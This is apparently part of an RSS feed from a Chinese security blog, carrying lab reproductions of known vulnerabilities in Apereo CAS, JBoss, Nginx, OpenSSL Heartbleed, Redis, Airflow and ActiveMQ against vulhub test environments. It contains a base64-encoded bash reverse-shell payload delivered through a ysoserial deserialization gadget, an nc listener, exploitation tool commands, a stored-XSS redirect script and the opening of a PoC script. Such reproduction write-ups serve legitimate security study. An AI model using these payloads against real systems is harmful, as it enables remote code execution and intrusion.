+反弹shell编码：java.lang.Runtime.exec() Payload Workarounds - @Jackson_T (jackson-t.ca)
+bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ip&amp;gt;/&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx}|{base64,-d}|{bash,-i} 利用工具里ysoserial的CommonsCollections4生成payload：
+java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &amp;#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx}|{base64,-d}|{bash,-i}&amp;#34; 在攻击机上打开一个监听终端：
+nc -lnvp &amp;lt;port&amp;gt; 访问http://&amp;lt;ip&amp;gt;:&amp;lt;port&amp;gt;/cas/login登录页面，抓取登录数据包，将execution替换为生成的payload：
+username=admin&amp;amp;password=123456&amp;amp;lt=LT-3-gwwPiolLX4sdBIY5cz0jhZSeWcsuHz-cas01.example.org&amp;amp;execution=&amp;lt;payload&amp;gt;&amp;amp;_eventId=submit&amp;amp;submit=LOGIN 替换完成之后转发数据包，监听终端成功反弹一个shell。
+文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>JBoss漏洞复现</title>
+      <link>https://oopsdc.com/post/jboss%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/jboss%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504 漏洞描述 Red Hat JBoss Application Server是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JBossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，攻击者可借助特制的序列化数据利用该漏洞执行任意代码。
+影响版本 JBoss AS 4.x及之前。
+复现思路 漏洞复现 环境搭建：
+git clone https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose up -d Jexboss工具：joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool (github.com)
+git clone https://github.com/joaomatosf/jexboss.git python3 jexboss.py -host http://&amp;lt;ip&amp;gt;:8080 成功利用漏洞执行命令。
+文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>Nginx漏洞复现</title>
+      <link>https://oopsdc.com/post/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>Nginx 越界读取缓存漏洞 CVE-2017-7529 漏洞描述 Nginx在反向代理站点的时候，通常会缓存一些文件，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括文件头+HTTP返回包头+HTTP返回包体。如果二次请求命中该缓存文件，Nginx会直接将该文件中的HTTP返回包体返回给用户。
+如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能读取到缓存文件中位于HTTP返回包体前的文件头、HTTP返回包头等内容。
+影响版本 Nginx 0.5.6 ~ 1.13.2
+复现思路 漏洞复现 环境搭建：
+git clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d 访问:http://&amp;lt;ip&amp;gt;:8080正常即可。
+POC已经在当前目录中给出来，文件名poc.py：
+#!/usr/bin/env python import sys import requests if len(sys.argv) &amp;lt; 2: print(&amp;#34;%s url&amp;#34; % (sys.argv[0])) print(&amp;#34;eg: python %s http://your-ip:8080/&amp;#34; % (sys.argv[0])) sys.exit() headers = { &amp;#39;User-Agent&amp;#39;: &amp;#34;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&amp;#34; } offset = 605 url = sys.argv[1] file_len = len(requests.</description>
+    </item>
+    
+    <item>
+      <title>服务器应用漏洞</title>
+      <link>https://oopsdc.com/post/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/</link>
+      <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/</guid>
+      <description>OpenSSL OpenSSL 心脏滴血漏洞 CVE-2014-0160 漏洞描述 2014年4月7日，OpenSSL发布安全公告，在OpenSSL 1.0.1 ~ 1.0.1f Beta1版本中存在漏洞，漏洞名为HeartBleed。其中Heart是指该漏洞位于心跳协议上，Bleed是因为该漏洞会造成数据泄露。即HeartBleed是在心跳协议上的一个数据泄露漏洞，OpenSSL库中用到了该心跳协议。
+影响版本 OpenSSL 1.0.1、1.0.1a、1.0.1b、1.0.1c、1.0.1d、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等。
+复现思路 漏洞复现 环境搭建:
+git clone https://github.com/vulhub/vulhub.git cd vulhub/openssl/heartbleed docker-compose up -d 使用msf对目标进行攻击:
+msfconsole set RHOST &amp;lt;ip&amp;gt; set verbose true run Redis Redis 主从复制RCE 漏洞描述 在2019年7月7日结束的WCTF2019 Final上，LC/BC成员Pavel Toporkov在分享会上介绍了一种关于Redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大。
+Pavel Toporkov的分享:
+15-redis-post-exploitation.pdf (zeronights.ru)
+影响版本 Redis &amp;lt;= 5.0.5
+复现思路 漏洞复现 环境搭建:
+docker pull a1143535418/redis5.0 docker run -p 6379:6379 -d a1143535418/redis5.0 redis-server 利用脚本:
+n0b0dyCN/redis-rogue-server: Redis(&amp;lt;=5.0.5) RCE (github.com)</description>
+    </item>
+    
+    <item>
+      <title>Apache漏洞复现</title>
+      <link>https://oopsdc.com/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://oopsdc.com/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>Airflow 存储型XSS 漏洞描述 Apache Airflow 1.10.2及之前版本的airflow webserver服务存在XSS漏洞，原因在于`WEB应用未对客户端数据进行正确验证，导致攻击者可利用该漏洞执行客户端代码。
+影响版本 Apache Airflow 1.10.3以下版本。
+漏洞复现 访问/admin/dagrun/(默认不需要密码)。
+创建一个项目，输入ID后点击保存，返回列表，点击running字样，发现能够输入HTML代码，例：
+&amp;lt;script&amp;gt;_a=&amp;#34;https://www.baidu.com&amp;#34;&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;document.location=_a&amp;lt;/script&amp;gt; 能直接造成存储型XSS。
+ActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是Apache软件经济会研发的一套开源消息中间件，支持Java消息服务、集群、Spring Framework等。Apache ActiveMQ 5.13.0之前版本，即5.x版本中存在反序列化漏洞，漏洞源于程序没有限制可在代理中序列化的类，攻击者通过借助特制序列化Java消息服务(JMS) ObjectMessage对象实现任意代码执行。
+影响版本 Apache ActiveMQ 5.13.0之前的5.x版本。
+复现思路 1.构造（可使用ysoserial）可执行命令的序列化对象。
+2.作为一个消息，发送给目标对应端口。
+3.访问Web管理页面，读取消息，触发漏洞。
+漏洞复现 使用jmet进行漏洞利用：ianxtianxt/jmet: Java Message Exploitation Tool (github.com)
+下载好之后在jmet-0.1.0-all.jar同级目录下创建external文件夹，避免出现文件夹不存在的报错。
+jmet的原理是使用jar包内置ysoserial生成Payload并发送，我们需要在ysoserial的gadget选择一个可使用的，如ROME。
+给目标ActiveMQ添加一个名为event的队列，点击事件为生成/tmp/vuln文件：
+java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &amp;#34;touch /tmp/vuln&amp;#34; -Yp ROME &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt; # 命令执行成功后回显如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:&amp;lt;server-id&amp;gt; INFO d.</description>
+    </item>
+    
+  </channel>
+</rss>
